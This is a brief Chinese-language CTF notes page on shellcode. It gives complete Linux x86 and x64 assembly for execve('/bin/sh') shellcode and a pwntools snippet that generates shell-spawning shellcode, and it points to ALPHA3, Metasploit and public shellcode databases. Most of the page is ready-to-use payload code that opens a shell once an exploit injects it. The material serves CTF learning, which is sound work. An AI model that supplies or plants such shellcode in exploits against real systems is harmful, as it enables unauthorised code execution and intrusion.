# Shellcode

## 编写

```asm
# linux/x86 execve("/bin/sh", 0, 0)
global _start
_start:
    xor  edx, edx ;; argv = 0
    xor  ecx, ecx ;; envp = 0
    push ecx
    push "/sh"
    push "/bin"
    mov  ebx, esp ;; pathname = "/bin/sh"
    mov  al, 0xb  ;; execve NR
    int  0x80     ;; syscall
```

```asm
# linux/x64 execve("/bin/sh", 0, 0)
global _start
_start:    
    mov  rbx, "/bin/sh"
    push rbx
    push rsp
    pop  rdi
    xor  esi, esi
    xor  edx, edx
    push 0x3b
    pop  rax
    syscall
```

设置参数并将系统调用的 NR(number) 写入指定寄存器后触发中断/syscall即可. 具体使用方式请参考 [Linux 系统调用](https://publicki.top/syscall.html).  

!!! info "CTF"
    可能限制系统调用的使用, 此时需要编写专门的 shellcode 只通过可用的系统调用完成任务.  

## 生成

- 利用 [ALPHA3](https://github.com/TaQini/alpha3) 生成由可见字符集构成的 shellcode.
- 利用 [MSF](./Metasploit.md) 生成 shellcode.
- 利用 pwntools 生成特定架构和系统的 shellcode.

    ```py
    from pwn import *
    context(log_level = 'debug', arch = 'i386', os = 'linux') # linux/x86
    shellcode = asm(shellcraft.sh())
    ```

## 拓展

- [Exploit Database Shellcodes](https://www.exploit-db.com/shellcodes)
- <http://shell-storm.org/shellcode/>
